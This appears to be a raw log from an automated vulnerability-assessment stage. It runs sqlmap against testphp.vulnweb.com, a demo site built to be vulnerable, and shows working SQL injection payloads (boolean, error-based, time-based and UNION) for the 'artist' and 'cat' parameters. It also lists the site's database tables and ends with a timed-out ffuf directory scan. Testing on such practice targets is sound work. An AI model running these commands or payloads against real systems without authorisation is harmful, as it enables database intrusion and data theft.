=== VULNERABILITY_ASSESSMENT STAGE ===

Command: sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch --threads=5
Return Code: 0
STDOUT:
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:29:44 /2025-06-18/

[20:29:44] [INFO] resuming back-end DBMS 'mysql' 
[20:29:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: artist (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: artist=1 AND 1365=1365

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: artist=1 AND GTID_SUBSET(CONCAT(0x71626b7071,(SELECT (ELT(3175=3175,1))),0x716b6b6a71),3175)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: artist=1 AND (SELECT 4802 FROM (SELECT(SLEEP(5)))dRvv)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: artist=-9067 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7071,0x6e4f5464716f4b574f674f554f4870527350767355796c564b674651666a566f506562586c70486a,0x716b6b6a71)-- -
---
[20:29:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.6.40, Nginx 1.19.0
back-end DBMS: MySQL >= 5.6
[20:29:45] [INFO] fetching tables for database: 'acuart'
Database: acuart
[8 tables]
+-----------+
| artists   |
| carts     |
| categ     |
| featured  |
| guestbook |
| pictures  |
| products  |
| users     |
+-----------+

[20:29:45] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
[20:29:45] [WARNING] your sqlmap version is outdated

[*] ending @ 20:29:45 /2025-06-18/



==================================================

Command: sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" --batch --threads=5
Return Code: 0
STDOUT:
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.8#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:29:47 /2025-06-18/

[20:29:47] [INFO] testing connection to the target URL
[20:29:48] [INFO] testing if the target URL content is stable
[20:29:48] [INFO] target URL content is stable
[20:29:48] [INFO] testing if GET parameter 'test' is dynamic
[20:29:48] [WARNING] GET parameter 'test' does not appear to be dynamic
[20:29:49] [INFO] heuristic (basic) test shows that GET parameter 'test' might be injectable (possible DBMS: 'MySQL')
[20:29:49] [INFO] heuristic (XSS) test shows that GET parameter 'test' might be vulnerable to cross-site scripting (XSS) attacks
[20:29:49] [INFO] testing for SQL injection on GET parameter 'test'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:29:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:29:49] [WARNING] reflective value(s) found and filtering out
[20:29:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:29:52] [INFO] testing 'Generic inline queries'
[20:29:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:30:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:30:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:30:27] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[20:30:46] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:31:04] [INFO] GET parameter 'test' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' injectable (with --string="PHP scanner")
[20:31:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:31:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:31:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:31:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:31:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:31:05] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:31:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:31:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:31:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:31:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:31:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:31:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:31:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:31:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:31:08] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:31:08] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[20:31:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[20:31:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:31:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[20:31:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[20:31:09] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[20:31:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[20:31:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:31:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[20:31:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[20:31:09] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[20:31:09] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[20:31:09] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[20:31:09] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[20:31:09] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[20:31:09] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[20:31:09] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[20:31:09] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[20:31:09] [INFO] testing 'MySQL inline queries'
[20:31:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:31:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:31:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:31:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:31:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:31:10] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:31:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:31:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[20:31:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[20:31:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[20:31:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[20:31:12] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[20:31:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[20:31:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[20:31:13] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[20:31:13] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[20:31:13] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[20:31:13] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[20:31:14] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[20:31:14] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[20:31:14] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[20:31:15] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[20:31:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[20:31:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[20:31:16] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[20:31:16] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[20:31:16] [INFO] testing 'MySQL AND time-based blind (ELT)'
[20:31:16] [INFO] testing 'MySQL OR time-based blind (ELT)'
[20:31:17] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[20:31:17] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[20:31:17] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:31:17] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:31:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[20:31:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[20:31:18] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)'
[20:31:18] [INFO] testing 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)'
[20:31:18] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[20:31:18] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[20:31:18] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[20:31:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[20:31:18] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)'
[20:31:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:31:18] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:31:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:31:24] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[20:31:30] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[20:31:35] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[20:31:41] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[20:31:47] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[20:31:53] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[20:31:58] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[20:32:03] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[20:32:07] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[20:32:07] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
[20:32:07] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[20:32:07] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
[20:32:07] [CRITICAL] connection reset to the target URL
[20:32:07] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
[20:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused')
[20:32:08] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
[20:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused')
[20:32:09] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)
there seems to be a continuous problem with connection to the target. Are you sure that you want to continue? [y/N] N
[20:32:10] [WARNING] your sqlmap version is outdated

[*] ending @ 20:32:10 /2025-06-18/



==================================================

Command: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --threads=5
Return Code: 0
STDOUT:
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:32:12 /2025-06-18/

[20:32:12] [INFO] testing connection to the target URL
[20:32:13] [INFO] testing if the target URL content is stable
[20:32:13] [INFO] target URL content is stable
[20:32:13] [INFO] testing if GET parameter 'cat' is dynamic
[20:32:14] [INFO] GET parameter 'cat' appears to be dynamic
[20:32:14] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
[20:32:14] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks
[20:32:14] [INFO] testing for SQL injection on GET parameter 'cat'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:32:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:32:14] [WARNING] reflective value(s) found and filtering out
[20:32:15] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="sem")
[20:32:15] [INFO] testing 'Generic inline queries'
[20:32:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:32:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:32:16] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:32:16] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:32:16] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:32:17] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[20:32:17] [INFO] testing 'MySQL inline queries'
[20:32:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:32:17] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
[20:32:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:32:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:32:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:32:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:32:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:32:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:32:34] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[20:32:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:32:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:32:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:32:36] [INFO] target URL appears to have 11 columns in query
[20:32:37] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 1564=1564

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716a7a6271,(SELECT (ELT(5649=5649,1))),0x71706b7071),5649)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cat=1 AND (SELECT 8415 FROM (SELECT(SLEEP(5)))IuGf)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a6271,0x64636b6e75547267564b595263797a6e56504d5a507a615659474856785446517848626c56734f6f,0x71706b7071),NULL,NULL,NULL,NULL-- -
---
[20:32:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
[20:32:38] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
[20:32:38] [WARNING] your sqlmap version is outdated

[*] ending @ 20:32:38 /2025-06-18/



==================================================

Command timed out: ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php,.html,.txt
==================================================

